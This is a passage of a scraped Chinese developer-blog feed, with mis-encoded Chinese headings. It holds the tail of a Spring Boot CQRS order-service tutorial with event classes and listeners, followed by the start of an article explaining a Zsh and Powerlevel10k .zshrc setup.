    <span class="hljs-keyword">public</span> Optional&lt;OrderView&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(String id)</span> {
        <span class="hljs-keyword">return</span> orderViewRepository.findById(id);
    }
}
</code></pre>
<h3 data-id="heading-13">6. åˆ›å»ºäº‹ä»¶å’Œäº‹ä»¶å¤„ç†å™¨</h3>
<h4 data-id="heading-14"><code>OrderCreatedEvent.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.io.Serializable;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCreatedEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> Long orderId;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;
}
</code></pre>
<h4 data-id="heading-15"><code>OrderUpdatedEvent.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.io.Serializable;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderUpdatedEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> Long orderId;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;
}
</code></pre>
<h4 data-id="heading-16"><code>OrderDeletedEvent.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.io.Serializable;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderDeletedEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> Long orderId;
}
</code></pre>
<h3 data-id="heading-17">7. äº‹ä»¶å‘å¸ƒå™¨å’Œå¤„ç†å™¨</h3>
<h4 data-id="heading-18">äº‹ä»¶å‘å¸ƒå™¨</h4>
<h5 data-id="heading-19"><code>EventPublisher.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.context.ApplicationEventPublisher;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EventPublisher</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ApplicationEventPublisher applicationEventPublisher;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EventPublisher</span><span class="hljs-params">(ApplicationEventPublisher applicationEventPublisher)</span> {
        <span class="hljs-built_in">this</span>.applicationEventPublisher = applicationEventPublisher;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publish</span><span class="hljs-params">(Object event)</span> {
        applicationEventPublisher.publishEvent(event);
    }
}
</code></pre>
<h4 data-id="heading-20">äº‹ä»¶å¤„ç†å™¨</h4>
<h5 data-id="heading-21"><code>OrderEventListener.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.context.event.EventListener;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventListener</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderViewRepository orderViewRepository;

    <span class="hljs-meta">@EventListener</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderCreatedEvent</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
        <span class="hljs-type">OrderView</span> <span class="hljs-variable">orderView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderView</span>();
        orderView.setId(event.getOrderId().toString());
        orderView.setProduct(event.getProduct());
        orderView.setQuantity(event.getQuantity());
        orderView.setPrice(event.getPrice());
        orderViewRepository.save(orderView);
    }

    <span class="hljs-meta">@EventListener</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderUpdatedEvent</span><span class="hljs-params">(OrderUpdatedEvent event)</span> {
        <span class="hljs-type">OrderView</span> <span class="hljs-variable">orderView</span> <span class="hljs-operator">=</span> orderViewRepository.findById(event.getOrderId().toString()).orElse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderView</span>());
        orderView.setProduct(event.getProduct());
        orderView.setQuantity(event.getQuantity());
        orderView.setPrice(event.getPrice());
        orderViewRepository.save(orderView);
    }

    <span class="hljs-meta">@EventListener</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderDeletedEvent</span><span class="hljs-params">(OrderDeletedEvent event)</span> {
        orderViewRepository.deleteById(event.getOrderId().toString());
    }
}
</code></pre>
<h3 data-id="heading-22">8. ä¿®æ”¹æœåŠ¡å±‚å‘å¸ƒäº‹ä»¶</h3>
<h4 data-id="heading-23">ä¿®æ”¹å†™æ“ä½œæœåŠ¡ï¼ˆCommand Serviceï¼‰</h4>
<h5 data-id="heading-24"><code>OrderCommandService.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCommandService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderRepository orderRepository;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> EventPublisher eventPublisher;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">savedOrder</span> <span class="hljs-operator">=</span> orderRepository.save(order);
        <span class="hljs-type">OrderCreatedEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderCreatedEvent</span>();
        event.setOrderId(savedOrder.getId());
        event.setProduct(savedOrder.getProduct());
        event.setQuantity(savedOrder.getQuantity());
        event.setPrice(savedOrder.getPrice());
        eventPublisher.publish(event);
        <span class="hljs-keyword">return</span> savedOrder;
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderRepository.save(order);
        <span class="hljs-type">OrderUpdatedEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderUpdatedEvent</span>();
        event.setOrderId(updatedOrder.getId());
        event.setProduct(updatedOrder.getProduct());
        event.setQuantity(updatedOrder.getQuantity());
        event.setPrice(updatedOrder.getPrice());
        eventPublisher.publish(event);
        <span class="hljs-keyword">return</span> updatedOrder;
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(Long id)</span> {
        orderRepository.deleteById(id);
        <span class="hljs-type">OrderDeletedEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderDeletedEvent</span>();
        event.setOrderId(id);
        eventPublisher.publish(event);
    }
}
</code></pre>
<h3 data-id="heading-25">9. åˆ›å»ºæ§åˆ¶å™¨</h3>
<h4 data-id="heading-26">å†™æ“ä½œæ§åˆ¶å™¨ï¼ˆCommand Controllerï¼‰</h4>
<h5 data-id="heading-27"><code>OrderCommandController.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCommandController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderCommandService orderCommandService;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">createdOrder</span> <span class="hljs-operator">=</span> orderCommandService.createOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(createdOrder);
    }

    <span class="hljs-meta">@PutMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id, <span class="hljs-meta">@RequestBody</span> Order order)</span> {
        order.setId(id); <span class="hljs-comment">// Ensure the order ID is set correctly</span>
        
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Šæ‰“é€ é«˜æ•ˆçš„å‰ç«¯å·¥ç¨‹å¸ˆç»ˆç«¯ï¼šä¸€ä»½å¯å¤åˆ¶çš„ Zsh + Powerlevel10k é…ç½®å®è·µã€‹]]></title>    <link>https://juejin.cn/post/7600990891206672411</link>    <guid>https://juejin.cn/post/7600990891206672411</guid>    <pubDate>2026-01-30T09:21:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600990891206672411" data-draft-id="7600967006892982281" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Šæ‰“é€ é«˜æ•ˆçš„å‰ç«¯å·¥ç¨‹å¸ˆç»ˆç«¯ï¼šä¸€ä»½å¯å¤åˆ¶çš„ Zsh + Powerlevel10k é…ç½®å®è·µã€‹"/> <meta itemprop="keywords" content="å‰ç«¯å·¥ç¨‹åŒ–"/> <meta itemprop="datePublished" content="2026-01-30T09:21:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="WaitingChen"/> <meta itemprop="url" content="https://juejin.cn/user/1900414998429544"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Šæ‰“é€ é«˜æ•ˆçš„å‰ç«¯å·¥ç¨‹å¸ˆç»ˆç«¯ï¼šä¸€ä»½å¯å¤åˆ¶çš„ Zsh + Powerlevel10k é…ç½®å®è·µã€‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1900414998429544/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    WaitingChen
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:21:40.000Z" title="Fri Jan 30 2026 09:21:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ç›®æ ‡å¾ˆç®€å•ï¼š<strong>å¿«ã€ç¨³ã€çˆ½</strong>ã€‚</p>
<p>å¿«ï¼šæ‰“å¼€ç»ˆç«¯ä¸æ‹–æ³¥å¸¦æ°´ï¼›
ç¨³ï¼šè¡¥å…¨ã€å†å²ã€æ’ä»¶ä¸äº’ç›¸æ‰“æ¶ï¼›
çˆ½ï¼š<code>git commit</code> è¿™ç§é«˜é¢‘å‘½ä»¤ï¼Œè‚Œè‚‰è®°å¿†çº§ä½“éªŒã€‚</p>
</blockquote>
<p>è¿™ç¯‡æ–‡ç« åŸºäºä¸€ä»½<strong>å¯ç›´æ¥ä½¿ç”¨çš„ <code>.zshrc</code> é…ç½®</strong>ï¼Œå®Œæ•´è®²æ¸…æ¥šæ¯ä¸€æ®µé…ç½®è§£å†³äº†ä»€ä¹ˆé—®é¢˜ã€ä¸ºä»€ä¹ˆè¦è¿™æ ·æ”¾ã€ä»¥åŠå®ƒå¸¦æ¥çš„å®é™…ä½“éªŒæå‡ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆè¦â€œè®¤çœŸé…ç½®â€ç»ˆç«¯ï¼Ÿ</h2>
<p>å¯¹äºå‰ç«¯å·¥ç¨‹å¸ˆæ¥è¯´ï¼Œç»ˆç«¯å¹¶ä¸æ˜¯å¶å°”ç”¨ä¸€ä¸‹çš„å·¥å…·ï¼Œè€Œæ˜¯ï¼š</p>
<ul>
<li>é«˜é¢‘ Git æ“ä½œï¼ˆ<code>git commit / rebase / checkout</code>ï¼‰</li>
<li>åŒ…ç®¡ç†ï¼ˆ<code>pnpm / npm / yarn</code>ï¼‰</li>
<li>æœ¬åœ°è°ƒè¯•ã€æ„å»ºã€è„šæ‰‹æ¶</li>
</ul>
<p>å¦‚æœç»ˆç«¯å…·å¤‡ä¸‹é¢è¿™äº›èƒ½åŠ›ï¼š</p>
<ul>
<li><strong>â†‘ / â†“ åªåœ¨â€œç›¸å…³å†å²â€é‡Œå¾ªç¯</strong></li>
<li><strong>è‡ªåŠ¨è”æƒ³ä½†ä¸æŠ¢é”®</strong></li>
<li><strong>è¡¥å…¨ç¨³å®šã€æ— å¡é¡¿</strong></li>
</ul>
<p>æ¯å¤©èŠ‚çœçš„ä¸æ˜¯å‡ ç§’ï¼Œè€Œæ˜¯<strong>æ³¨æ„åŠ›å’Œå¿ƒæ™ºè´Ÿæ‹…</strong>ã€‚</p>
<h2 data-id="heading-1">äºŒã€æ•´ä½“ç»“æ„è®¾è®¡åŸåˆ™</h2>
<p>è¿™ä»½é…ç½®éµå¾ªå‡ ä¸ªæ˜ç¡®çš„åŸåˆ™ï¼š</p>
<ol>
<li><strong>å¯åŠ¨ç›¸å…³çš„é…ç½®å°½é‡é å‰</strong>ï¼ˆé¿å…é—ªå±ã€å¡é¡¿ï¼‰</li>
<li><strong>åŠŸèƒ½æ€§æ¨¡å—åˆ†åŒºæ¸…æ™°</strong>ï¼ˆè¡¥å…¨ã€å†å²ã€è”æƒ³ã€é«˜äº®å„å¸å…¶èŒï¼‰</li>
<li><strong>é¡ºåºä¸¥æ ¼</strong>ï¼ˆè¿™æ˜¯å¾ˆå¤šé—®é¢˜çš„æ ¹æºï¼‰</li>
</ol>
<p>ä¸‹é¢æŒ‰æ¨¡å—é€ä¸€æ‹†è§£ã€‚</p>
<h2 data-id="heading-2">ä¸‰ã€Powerlevel10k Instant Promptï¼šå¯åŠ¨é€Ÿåº¦çš„å…³é”®</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">if</span> [[ -r <span class="hljs-string">"<span class="hljs-variable">${XDG_CACHE_HOME:-<span class="hljs-variable">$HOME</span>/.cache}</span>/p10k-instant-prompt-<span class="hljs-variable">${(%):-%n}</span>.zsh"</span> ]]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">source</span> <span class="hljs-string">"<span class="hljs-variable">${XDG_CACHE_HOME:-<span class="hljs-variable">$HOME</span>/.cache}</span>/p10k-instant-prompt-<span class="hljs-variable">${(%):-%n}</span>.zsh"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<p>è¿™æ˜¯ Powerlevel10k å®˜æ–¹æ¨èçš„ <strong>Instant Prompt</strong> å†™æ³•ï¼Œä½œç”¨æ˜¯ï¼š</p>
<ul>
<li>åœ¨ Zsh å®Œå…¨åˆå§‹åŒ–ä¹‹å‰ï¼Œ<strong>å…ˆæ¸²æŸ“ Prompt</strong></li>
<li>é¿å…ç»ˆç«¯å¯åŠ¨æ—¶çš„â€œç™½å±ç­‰å¾…â€</li>
</ul>
<h2 data-id="heading-3">å››ã€NVM ä¸ä¸»é¢˜åŠ è½½ï¼šç¨³å®šä¼˜å…ˆ</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">export</span> NVM_DIR=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.nvm"</span>
[ -s <span class="hljs-string">"/opt/homebrew/opt/nvm/nvm.sh"</span> ] &amp;&amp; . <span class="hljs-string">"/opt/homebrew/opt/nvm/nvm.sh"</span>

<span class="hljs-built_in">source</span> /opt/homebrew/share/powerlevel10k/powerlevel10k.zsh-theme
[[ -f ~/.p10k.zsh ]] &amp;&amp; <span class="hljs-built_in">source</span> ~/.p10k.zsh
</code></pre>
<p>è¿™é‡Œé€‰æ‹©çš„æ˜¯<strong>æœ€ç¨³å¦¥ã€æœ€ä¸å®¹æ˜“å‡ºå‘</strong>çš„æ–¹å¼ï¼š</p>
<ul>
<li>ä¸åšè¿‡åº¦é­”æ”¹</li>
<li>ä¸æå‰ä¼˜åŒ–å¯åŠ¨æ—¶é—´</li>
</ul>
<p>å¦‚æœåç»­éœ€è¦è¿½æ±‚æè‡´å¯åŠ¨é€Ÿåº¦ï¼Œå†å¯¹ NVM åš lazy load å³å¯ã€‚</p>
<h2 data-id="heading-4">äº”ã€PATH ç®¡ç†ï¼šå»é‡æ˜¯éšè—çš„å·¥ç¨‹å¸ˆç»†èŠ‚</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># ç¤ºä¾‹ï¼šå°†è‡ªå®šä¹‰å·¥å…·åŠ å…¥ PATHï¼ˆè¯·æŒ‰éœ€ä¿®æ”¹æˆ–åˆ é™¤ï¼‰</span>
<span class="hljs-comment"># export PATH="$HOME/.comate/bin:$PATH"</span>

<span class="hljs-built_in">typeset</span> -U PATH path
</code></pre>
<p><code>typeset -U PATH path</code> çš„ä½œç”¨æ˜¯ï¼š</p>
<ul>
<li>è‡ªåŠ¨å»é‡ PATH</li>
<li><strong>ä¿ç•™ç¬¬ä¸€æ¬¡å‡ºç°çš„é¡ºåº</strong></li>
</ul>
<p>è¿™èƒ½é¿å…ï¼š</p>
<ul>
<li>PATH æ— é™å¢é•¿</li>
<li>åŒä¸€ä¸ªäºŒè¿›åˆ¶è¢«å¤šæ¬¡æ‰«æ</li>
</ul>
<p>å±äºâ€œçœ‹ä¸è§ï¼Œä½†å¾ˆä¸“ä¸šâ€çš„é…ç½®ã€‚</p>
<h2 data-id="heading-5">å…­ã€è¡¥å…¨ç³»ç»Ÿï¼šä¸€åˆ‡ä½“éªŒçš„åœ°åŸº</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">autoload</span> -Uz compinit
compinit -d ~/.zcompdump
</code></pre>
<p>è¡¥å…¨ç³»ç»Ÿæ˜¯å¾ˆå¤šæ’ä»¶çš„åŸºç¡€ï¼ˆåŒ…æ‹¬è‡ªåŠ¨è”æƒ³ï¼‰ã€‚</p>
<p>æ˜¾å¼æŒ‡å®š <code>.zcompdump</code> æ–‡ä»¶å¯ä»¥ï¼š</p>
<ul>
<li>é¿å…å¶å‘çš„è¡¥å…¨é‡å»º</li>
<li>æé«˜ç¨³å®šæ€§</li>
</ul>
<p><strong>é¡ºåºè¦æ±‚</strong>ï¼š</p>
<blockquote>
<p><code>compinit</code> å¿…é¡»åœ¨ autosuggestions ä¹‹å‰ã€‚</p>
</blockquote>
<h2 data-id="heading-6">ä¸ƒã€å†å²è¡Œä¸ºä¼˜åŒ–ï¼šè®©â€œâ†‘â€å˜èªæ˜</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">setopt</span> HIST_IGNORE_ALL_DUPS
<span class="hljs-built_in">setopt</span> HIST_REDUCE_BLANKS
<span class="hljs-built_in">setopt</span> INC_APPEND_HISTORY
<span class="hljs-built_in">setopt</span> SHARE_HISTORY
</code></pre>
<p>è¿™äº›é€‰é¡¹å…±åŒè§£å†³äº†å‡ ä¸ªç—›ç‚¹ï¼š</p>
<ul>
<li>åŒä¸€æ¡å‘½ä»¤ä¸ä¼šæ— é™åˆ·å†å²</li>
<li>å¤šä½™ç©ºæ ¼ä¸ä¼šå½±å“åŒ¹é…</li>
<li>å¤šä¸ªç»ˆç«¯çª—å£å…±äº«å†å²</li>
</ul>
<p>ç»“æœæ˜¯ï¼š</p>
<blockquote>
<p>å†å²è®°å½•æ›´å¹²å‡€ï¼Œæœç´¢æ›´ç²¾å‡†ã€‚</p>
</blockquote>
<h2 data-id="heading-7">å…«ã€â†‘ / â†“ å‰ç¼€å†å²æœç´¢ï¼ˆæ ¸å¿ƒä½“éªŒï¼‰</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">bindkey</span> -M emacs <span class="hljs-string">'^[[A'</span> history-beginning-search-backward
<span class="hljs-built_in">bindkey</span> -M emacs <span class="hljs-string">'^[[B'</span> history-beginning-search-forward
</code></pre>
<p>è¿™æ˜¯æ•´ä»½é…ç½®çš„<strong>çµé­‚éƒ¨åˆ†</strong>ã€‚</p>
<h3 data-id="heading-8">è¡Œä¸ºå¯¹æ¯”</h3>
<p>å†å²ä¸­æœ‰ï¼š</p>
<pre><code class="hljs language-sh" lang="sh">git commit -m <span class="hljs-string">"init"</span>
git commit --amend
git checkout main
pnpm install
</code></pre>
<p>å½“ä½ è¾“å…¥ï¼š</p>
<pre><code class="hljs language-sh" lang="sh">git commit
</code></pre>
<p>æŒ‰ â†‘ / â†“ï¼š</p>
<ul>
<li>âœ… åªä¼šå‡ºç° <code>git commit ...</code></li>
<li>âŒ ä¸ä¼šæ··å…¥ <code>checkout / pnpm</code></li>
</ul>
<p>è¿™æ˜¯<strong>ä¸¥æ ¼çš„å‰ç¼€åŒ¹é…</strong>ï¼Œéå¸¸é€‚åˆ Git è¿™ç±»å‘½ä»¤æ—ã€‚</p>
<h2 data-id="heading-9">ä¹ã€è‡ªåŠ¨è”æƒ³ï¼šè¾…åŠ©è€Œä¸æ˜¯å¹²æ‰°</h2>
<pre><code class="hljs language-sh" lang="sh">ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE=<span class="hljs-string">'fg=8'</span>
<span class="hljs-built_in">source</span> /opt/homebrew/share/zsh-autosuggestions/zsh-autosuggestions.zsh
</code></pre>
<ul>
<li>ç°è‰²æç¤ºè¶³å¤Ÿå…‹åˆ¶</li>
<li>åªåšâ€œæç¤ºâ€ï¼Œä¸æŠ¢æ§åˆ¶æƒ</li>
</ul>
<p>å¹¶ä¸”é€šè¿‡ <code>-M emacs</code> çš„ bindkey å†™æ³•ï¼Œç¡®ä¿å®ƒä¸ä¼šå’Œ â†‘ / â†“ è¡Œä¸ºå†²çªã€‚</p>
<h2 data-id="heading-10">åã€è¯­æ³•é«˜äº®ï¼šä¸ºä»€ä¹ˆå¿…é¡»æ”¾æœ€åï¼Ÿ</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">source</span> /opt/homebrew/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
</code></pre>
<p>è¿™æ˜¯å®˜æ–¹å’Œç¤¾åŒºåå¤å¼ºè°ƒçš„ä¸€ç‚¹ï¼š</p>
<blockquote>
